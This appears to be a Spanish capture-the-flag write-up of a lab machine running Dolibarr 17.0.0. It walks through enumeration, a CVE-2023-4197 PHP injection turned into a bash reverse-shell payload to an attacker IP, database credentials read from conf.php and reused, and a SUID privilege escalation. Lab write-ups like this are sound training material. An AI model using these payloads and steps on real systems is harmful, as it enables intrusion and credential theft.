@@ -1,0 +1,161 @@
+Discovery
+
+------------------
+Nmap
+
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
+|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
+|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+No tenemos el nombre del dominio, pero probablemente viendo la web es board.htb
+
+La web tiene 2 formularios uno de contacto y otro de newsletter que se puede ver despues.
+
+Pruebo a buscar directorios ocultos accesibles
+
+sudo gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://board.htb -t 200
+
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 307] [--> http://board.htb/images/]
+/css                  (Status: 301) [Size: 304] [--> http://board.htb/css/]
+/js                   (Status: 301) [Size: 303] [--> http://board.htb/js/]
+/server-status        (Status: 403) [Size: 274]
+Progress: 220559 / 220560 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+no parece haber gran cosa
+
+probamos con subdominios
+
+wfuzz -c -z file,/usr/share/SecLists/Discovery/DNS/n0kovo_subdomains_medium.txt -t 200 --hh=15949 -H "HOST: FUZZ.board.htb" http://board.htb
+
+mientras acaba revisamos el subdominio crm que nos aparece, y añadimos al hosts
+
+el CRM aparece como Dolibarr 17.0.0
+
+probamos admin admin, y similares
+
+Curiosamente el admin admin nos lleva a otras zonas con un error en pantalla
+----
+Access denied.
+You try to access to a page, area or feature of a disabled module or without being in an authenticated session or that is not allowed to your user.
+
+Current login: admin
+Permission for this login can be defined by your Dolibarr administrator from menu Home->Users.Note: clear your browser cookies to destroy existing sessions for this login. 
+----
+
+Realmente aunque parece capado el acceso, tenemos acceso al menú de usuario y se pueden subir archivos y similares
+
+en el searchsploit lo más parecido a nuestra version es este fallo
+
+Dolibarr Version 17.0.1 - Stored XSS  | php/webapps/51683.txt
+
+Buscando más por internet me encuentro con esto
+
+https://starlabs.sg/advisories/23/23-4197/
+
+https://starlabs.sg/advisories/23/images/CVE-2023-4197_02.Exploit.gif
+
+Básicamente el script parece que crea un sitio y modifica el sitio para añadir al header la añade el comando que queremo ejecutar
+
+--
+"htmlheader": f"<? echo system('{cmd}'); ?>"
+--
+
+Finalmente no encontramos más subdominios, vamos a continuar con el exploit que parece bastante prometedor
+
+Me es más fácil modificar el script para hacer una revershell
+
+borramos los arg de cmd 2 veces y que los arg sean 4 para que se ejecute y cambiamos la linea del header a
+"htmlheader": f"<?PHP system('bash -c \"bash -i >& /dev/tcp/10.10.x.x/4455 0>&1\"'); ?>"
+
+En caso contrario solo es editarlo con el crm
+
+python3 -m http.server -d . 4433
+
+me descargo linpeas.sh
+
+Ejecuto y dejo que haga su magia para ver como hacemos para escalar privilegios
+
+Tenemos un usuario llamado larissa
+
+uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)
+
+El ssh permite login de root
+
+/var/www/html/crm.board.htb/htdocs/admin/system/database.php
+
+Buscando en internet el archivo de configuración sería conf.PHP
+https://wiki.dolibarr.org/index.php?title=Configuration_file
+
+find ./ -name conf.php
+
+$dolibarr_main_db_host='localhost';
+$dolibarr_main_db_port='3306';
+$dolibarr_main_db_name='dolibarr';
+$dolibarr_main_db_prefix='llx_';
+$dolibarr_main_db_user='dolibarrowner';
+$dolibarr_main_db_pass='serverfun2$2023!!';
+
+Pues con eso ya tenemos el usuario de larissa
+
+--------------------------
+[+] [CVE-2022-0847] DirtyPipe
+
+   Details: https://dirtypipe.cm4all.com/
+   Exposure: probable
+   Tags: [ ubuntu=(20.04|21.04) ],debian=11
+   Download URL: https://haxx.in/files/dirtypipez.c
+
+[+] [CVE-2021-3156] sudo Baron Samedit
+
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: probable
+   Tags: mint=19,[ ubuntu=18|20 ], debian=10
+   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
+
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: probable
+   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
+   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
+
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+
+   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
+   Exposure: probable
+   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
+   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
+   Comments: ip_tables kernel module must be loaded
+
+-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys (Unknown SUID binary!)
+-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd (Unknown SUID binary!)
+-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight (Unknown SUID binary!)
+-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!)
+
+Pruebo un script de dirty pipe en python no parece funcionar
+Tampoco el resto de los CVE
+
+Buscando por enlightenment suid encontramos
+https://www.exploit-db.com/exploits/51180
+
+Bueno finalmente ejecutamos y comprobamos que somos root
